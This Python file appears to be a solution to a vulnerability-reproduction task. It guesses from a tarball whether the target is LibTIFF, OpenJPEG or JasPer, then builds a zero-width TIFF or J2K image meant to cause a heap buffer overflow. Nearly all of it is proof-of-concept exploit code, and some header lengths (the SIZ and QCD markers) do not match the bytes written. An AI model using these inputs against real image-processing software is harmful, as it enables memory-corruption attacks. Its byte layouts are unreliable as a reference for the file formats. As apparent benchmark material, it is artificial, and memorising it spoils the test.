import tarfile
import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The problem describes a Heap Buffer Overflow caused by "zero width or height images".
        This is a common vulnerability pattern in image processing libraries like LibTIFF and OpenJPEG.
        The solution attempts to identify the target library from the source path and generates
        a malformed image file (TIFF or J2K) with zero dimensions but large data payloads
        to trigger the overflow.
        """
        is_tiff = False
        is_openjpeg = False
        is_jasper = False

        # Attempt to identify the library from tarball contents
        try:
            with tarfile.open(src_path, 'r:*') as tar:
                for name in tar.getnames():
                    lower_name = name.lower()
                    if 'tiff' in lower_name and 'libtiff' in lower_name:
                        is_tiff = True
                        break
                    if 'openjpeg' in lower_name:
                        is_openjpeg = True
                        break
                    if 'jasper' in lower_name:
                        is_jasper = True
                        break
        except Exception:
            pass

        # Fallback based on filename if tar inspection failed or was inconclusive
        if not (is_tiff or is_openjpeg or is_jasper):
            lower_path = src_path.lower()
            if 'tiff' in lower_path:
                is_tiff = True
            elif 'openjpeg' in lower_path:
                is_openjpeg = True
            elif 'jasper' in lower_path:
                is_jasper = True
            else:
                # Default to TIFF as it's a very common target for this specific bug pattern
                is_tiff = True

        if is_tiff:
            return self.generate_tiff_poc()
        elif is_openjpeg or is_jasper:
            return self.generate_j2k_poc()
        
        return self.generate_tiff_poc()

    def generate_tiff_poc(self) -> bytes:
        # Generates a TIFF file with ImageWidth=0 to trigger Heap Buffer Overflow.
        # Logic: buffer allocation size = Width * RowsPerStrip * ... = 0.
        # But read operation uses StripByteCounts = 2000.
        # This causes a heap overflow write.
        
        # Header: Little Endian (II), Version 42, Offset to IFD (8)
        header = struct.pack('<II', 0x002A4949, 8)
        
        # IFD Entries (Must be sorted by Tag ID)
        entries = []
        fmt = '<HHII' # Tag, Type, Count, Value/Offset
        
        # 256: ImageWidth = 0 (VULNERABILITY TRIGGER)
        entries.append(struct.pack(fmt, 256, 3, 1, 0))
        
        # 257: ImageLength = 10
        entries.append(struct.pack(fmt, 257, 3, 1, 10))
        
        # 258: BitsPerSample = 8
        entries.append(struct.pack(fmt, 258, 3, 1, 8))
        
        # 259: Compression = 1 (None)
        entries.append(struct.pack(fmt, 259, 3, 1, 1))
        
        # 262: PhotometricInterpretation = 1 (BlackIsZero)
        entries.append(struct.pack(fmt, 262, 3, 1, 1))
        
        # Calculate offset for StripOffsets
        # Header(8) + Count(2) + 9 entries * 12 + Next(4) = 122
        data_offset = 122
        
        # 273: StripOffsets -> Points to data immediately after IFD
        entries.append(struct.pack(fmt, 273, 4, 1, data_offset))
        
        # 277: SamplesPerPixel = 1
        entries.append(struct.pack(fmt, 277, 3, 1, 1))
        
        # 278: RowsPerStrip = 10
        entries.append(struct.pack(fmt, 278, 3, 1, 10))
        
        # 279: StripByteCounts = 2000 (Size of read)
        entries.append(struct.pack(fmt, 279, 4, 1, 2000))
        
        # Construct IFD: Count + Entries + NextPtr(0)
        num_entries = len(entries)
        ifd = struct.pack('<H', num_entries) + b''.join(entries) + struct.pack('<I', 0)
        
        # Payload (Garbage data to be read into the overflowing buffer)
        payload = b'A' * 2000
        
        return header + ifd + payload

    def generate_j2k_poc(self) -> bytes:
        # Generates a J2K codestream with Xsiz (Width) = 0 to trigger Heap Buffer Overflow.
        
        # SOC (Start of Codestream)
        soc = b'\xFF\x4F'
        
        # SIZ Marker (Image and tile size)
        # Length: 38 (fixed fields) + 3 (1 component) + 2 (len field itself) = 43
        lsiz = 43
        
        siz = b'\xFF\x51' + struct.pack('>H', lsiz)
        siz += struct.pack('>H', 0)      # Rsiz (Capabilities)
        siz += struct.pack('>I', 0)      # Xsiz (Width) = 0 (VULNERABILITY TRIGGER)
        siz += struct.pack('>I', 128)    # Ysiz (Height)
        siz += struct.pack('>I', 0)      # XOsiz (Grid offset X)
        siz += struct.pack('>I', 0)      # YOsiz (Grid offset Y)
        siz += struct.pack('>I', 128)    # XTsiz (Tile Width)
        siz += struct.pack('>I', 128)    # YTsiz (Tile Height)
        siz += struct.pack('>I', 0)      # XTOsiz
        siz += struct.pack('>I', 0)      # YTOsiz
        siz += struct.pack('>H', 1)      # Csiz (1 component)
        siz += b'\x07\x01\x01'           # Component 0: 8-bit, 1x1 subsampling
        
        # COD Marker (Coding style default)
        # Length: 12 bytes
        cod = b'\xFF\x52' + struct.pack('>H', 12)
        cod += b'\x00'                   # Scod
        cod += b'\x00\x00\x01\x00'       # SGcod
        cod += b'\x00\x00\x00\x00\x00'   # SPcod
        
        # QCD Marker (Quantization default)
        # Minimal valid QCD
        qcd = b'\xFF\x5C' + struct.pack('>H', 4) # Len = 4
        qcd += b'\x00'                   # Sqcd (No quantization)
        
        # EOC (End of Codestream)
        eoc = b'\xFF\xD9'
        
        return soc + siz + cod + qcd + eoc
